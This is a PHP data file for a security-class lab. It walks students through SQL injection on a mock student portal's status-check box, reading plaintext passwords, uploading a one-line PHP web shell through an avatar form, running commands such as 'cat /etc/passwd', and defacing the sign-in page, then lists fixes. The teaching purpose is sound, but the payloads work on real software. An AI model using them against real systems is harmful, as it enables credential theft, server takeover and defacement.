<?php
/* Guided walkthrough. Lab harness, not part of the University A Student Portal. */

/* Payloads that point at a file this player uploaded need this player's
 * own sandbox, which is different in every browser in the room. Built
 * from the request itself so it is correct on whatever host/port this
 * copy is actually served from. */
$ss_scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$u = $ss_scheme . '://' . $_SERVER['HTTP_HOST'] . '/' . ss_inst_url();

$GUIDE = [
'intro' => 'Two mistakes, one behind the other. The "Check application status" box on the sign-in page builds its SQL by gluing your text into it, and the avatar form on your profile saves whatever you hand it into a folder the server will execute. The first gives you the administrator\'s password. The second is waiting behind the administrator\'s own login.<br><br>There is no sign-up on this portal - accounts are issued by the Registrar\'s Office, same as a real campus SSO. You do not need an account for any of this: the SQL injection below is reachable from the sign-in page with nobody logged in at all.',
'steps' => [

['t' => 'Search for something normal',
 'b' => '<p>On the sign-in page, find <strong>Check application status</strong>. Type a name fragment and press <strong>Check status</strong>.</p>',
 'try' => [
     'Applicant name' => 'a',
 ],
 'see' => 'A few rows. Your text travelled into the database and came back as results. Hold on to that: it <em>went into</em> the database.',
],

['t' => 'Send one apostrophe',
 'b' => '<p>Clear the box. Type a single <code>\'</code> and press Check status.</p>',
 'try' => [
     'Applicant name' => '\'',
 ],
 'see' => 'A red <strong>SQL error</strong> - the database\'s own complaint, printed on the page. That only happens if your text arrived as part of the instruction instead of as data.',
],

['t' => 'Read every username and password',
 'b' => '<p>One row per account: the Applicant column is the username, the Date column holds the password - not a date at all, just whatever you told the page to print there.</p>',
 'try' => [
     'Applicant name' => 'zzz\' UNION SELECT 1,username,3,4,password FROM users -- -',
 ],
 'see' => 'Forty-two accounts, and their passwords are <strong>just sitting there</strong>. Not hashes to crack - the passwords. Page through them and notice how many are the same.',
],

['t' => 'Sign in as the administrator',
 'b' => '<p>Scroll up to the <strong>Sign in</strong> form on this same page. Username <code>admin</code>, password the one you just read off the screen.</p>',
 'see' => 'You are the administrator. A <strong>DASHBOARD</strong> loads, and an <strong>ADMIN</strong> tab appears in the navigation. The SQL injection is over - everything after this is just being logged in.',
],

['t' => 'Find somewhere to put a file',
 'b' => '<p>Go to <strong>PROFILE</strong>, then <strong>Edit profile</strong>.</p>',
 'see' => 'An avatar form. It takes a file and says nothing about what kind of file.',
],

['t' => 'Write a one-line web shell',
 'b' => '<p>Make a file on your own computer called <code>shell.php</code> holding exactly this:</p>',
 'try' => [
     'shell.php' => '<?php system($_GET[\'c\']); ?>',
     '--1' => '<strong>Windows:</strong> Notepad, then Save as, and set <em>Save as type</em> to <em>All files</em> so it does not become shell.php.txt.',
     '--2' => '<strong>Mac:</strong> TextEdit, then Format &rarr; Make Plain Text before you save.',
     '--3' => '<strong>Linux or a terminal:</strong> <code>nano shell.php</code>, paste, <strong>Ctrl+O</strong> then <strong>Enter</strong> to save, <strong>Ctrl+X</strong> to leave.',
 ],
 'see' => 'A text file, nineteen characters long. It takes whatever you put in <code>c</code> and runs it as a command on the server.',
],

['t' => 'Upload it',
 'b' => '<p>Back on <strong>Edit profile</strong>, choose <code>shell.php</code> and press <strong>Upload avatar</strong>.</p>',
 'see' => 'A message saying where it saved. No complaint about the extension, because nothing looked at it. Your broken avatar is a PHP file now.',
],

['t' => 'Run a command',
 'b' => '<p>Open the file you just uploaded, and put a command in <code>c</code>.</p>',
 'try' => [
     'Open in the address bar' => $u . '/shell.php?c=id',
 ],
 'see' => '<code>uid=33(www-data) gid=33(www-data)</code>. That is not your browser talking - that is the server running your command and reading the answer back to you.',
],

['t' => 'Look around',
 'b' => '<p>Change the command. Anything the web server user can do, you can now do.</p>',
 'try' => [
     'What is in here' => $u . '/shell.php?c=ls -la',
     'Who lives on this box' => $u . '/shell.php?c=cat /etc/passwd',
 ],
 'see' => 'A directory listing, then the account list. This is the moment the bug stops being about one page.',
],

['t' => 'Deface the sign-in page',
 'b' => '<p>Write a new sign-in page. The shell runs in its own folder, so <code>home.html</code> lands where the site will find it. The command is one line - press COPY, do not retype it.</p>',
 'try' => [
     'Run' => $u . '/shell.php?c=echo "<!DOCTYPE html><html><head><title>OWNED</title><style>body{background:rgb(34,34,34);color:white;font-family:monospace;text-align:center;margin:0;padding-top:20px;overflow:hidden}marquee{background:green;color:white;font-size:20px;padding:6px 0;font-weight:bold}h1{font-size:3em;margin:20px 0 4px;text-shadow:0 0 0.6em red}h2{font-size:1.6em;margin:0 0 20px;text-shadow:0 0 0.6em red}.tag{font-size:1.4em;color:white;min-height:1.6em;position:relative;z-index:2}.line{font-size:1em;margin:6px;opacity:0.85;position:relative;z-index:2}.credit{font-size:0.85em;color:gray;margin-top:24px;position:relative;z-index:2}@keyframes rain{from{top:-30px;opacity:1}to{top:110vh;opacity:0}}</style></head><body><marquee>WEEK 1  SECURITY CLASS  NO MERCY FOR UNVALIDATED UPLOADS</marquee><h1>SYSTEM COMPROMISED</h1><h2>a bored student with a browser</h2><p class=tag id=tag>loading...</p><p class=line>root access obtained via one unrestricted file upload</p><p class=credit>This is a classroom simulation. Please do not actually go to jail.</p><script>var GLITCH = [\'A\',\'B\',\'X\',\'Z\',\'0\',\'1\',\'9\',\'.\',\'-\',\'_\',\'(\',\')\',\'[\',\']\',\'<\',\'>\',\'=\',\'?\',\'/\',\':\',\';\'];function Scramble(el){    this.el = el;    this.frame = 0;}Scramble.prototype.setText = function(newText){    var oldText = this.el.textContent;    var length = Math.max(oldText.length, newText.length);    this.queue = [];    for (var i = 0; i < length; i = i - -1) {        var from = oldText[i] || \'\';        var to = newText[i] || \'\';        var start = Math.floor(Math.random()*20);        var end = start - -Math.floor(Math.random()*20);        this.queue.push({from:from,to:to,start:start,end:end,char:null});    }    this.frame = 0;    this.update();};Scramble.prototype.update = function(){    while (this.el.firstChild) { this.el.removeChild(this.el.firstChild); }    var complete = 0;    for (var i = 0; i < this.queue.length; i = i - -1) {        var item = this.queue[i];        if (this.frame >= item.end) {            complete = complete - -1;            this.el.appendChild(document.createTextNode(item.to));        } else if (this.frame >= item.start) {            if (!item.char || Math.random() < 0.3) {                item.char = GLITCH[Math.floor(Math.random()*GLITCH.length)];            }            var span = document.createElement(\'span\');            span.style.color = \'gray\';            span.appendChild(document.createTextNode(item.char));            this.el.appendChild(span);        } else {            this.el.appendChild(document.createTextNode(item.from));        }    }    if (complete === this.queue.length) { return; }    this.frame = this.frame - -1;    var self = this;    requestAnimationFrame(function(){ self.update(); });};var PHRASES = [\'SYSTEM COMPROMISED\',\'WEEK 1 SECURITY CLASS\',\'YOU HAD ONE JOB: VALIDATE THE UPLOAD\',\'NO REAL DAMAGE. JUST VIBES.\',\'THIS COULD HAVE BEEN YOUR SERVER\'];var tagEl = document.getElementById(\'tag\');var scramble = new Scramble(tagEl);var idx = 0;function nextPhrase(){    scramble.setText(PHRASES[idx]);    idx = idx - -1;    if (idx >= PHRASES.length) { idx = 0; }    setTimeout(nextPhrase, 2200);}nextPhrase();var RAIN_WORDS = [\'ROOT\',\'PWNED\',\'SHELL\',\'WEEK 1\',\'ACCESS\',\'0DAY\',\'HACKED\',\'OOPS\'];var SIZES = [14,16,18,20,22,24];var DURATIONS = [4,5,6,7];function dropWord(){    var word = RAIN_WORDS[Math.floor(Math.random()*RAIN_WORDS.length)];    var span = document.createElement(\'span\');    span.textContent = word;    span.style.position = \'absolute\';    span.style.color = \'red\';    span.style.opacity = \'0.6\';    span.style.fontFamily = \'monospace\';    var leftPct = Math.floor(Math.random()*90);    span.style.left = [leftPct,\'vw\'].join(\'\');    var size = SIZES[Math.floor(Math.random()*SIZES.length)];    span.style.fontSize = [size,\'px\'].join(\'\');    var duration = DURATIONS[Math.floor(Math.random()*DURATIONS.length)];    span.style.top = \'-30px\';    span.style.animation = [\'rain \',duration,\'s linear forwards\'].join(\'\');    document.body.appendChild(span);    setTimeout(function(){        if (span.parentNode) { span.parentNode.removeChild(span); }    }, duration*1000);}setInterval(dropWord, 400);dropWord();</script></body></html>" > home.html',
     '--1' => 'Now open the portal\'s sign-in page.',
 ],
 'see' => 'A scrolling banner, a scrambling phrase, words raining down the screen. The sign-in page is gone. That is the <strong>I</strong> in the CIA triad - integrity - and it is the version of this your users notice.',
],

['t' => 'Put it back',
 'b' => '<p>Click <strong>RESTORE SIGN-IN PAGE</strong> in the corner.</p>',
 'see' => 'The sign-in page returns. Your shell is still there. Only you ever saw the defacement - everyone else in the room gets to do it themselves.',
],
],
'after' => '<p>Neither bug is exotic. The status-check box trusts text to stay text, and the upload form trusts a filename to describe its contents. Both are decades old and both are still shipping.</p><p>What made it a bad day was the order. Reading the database would have been a report on its own; reading <em>plain text passwords</em> turned it into a key. Hashing would not have stopped the injection - it would have stopped the injection from mattering.</p><p>Three fixes, each one sufficient to break the chain:</p><p><strong>1.</strong> Bind the parameter. Pass the search term as a value, not as part of the query, and every payload above becomes a result nobody has.</p><p><strong>2.</strong> Hash the passwords. The dump still happens and is still a breach, but nobody signs in with it.</p><p><strong>3.</strong> Store uploads outside the web root, rename them, and never let the server execute what a user sent. Then a PHP file is just a file.</p>',
];
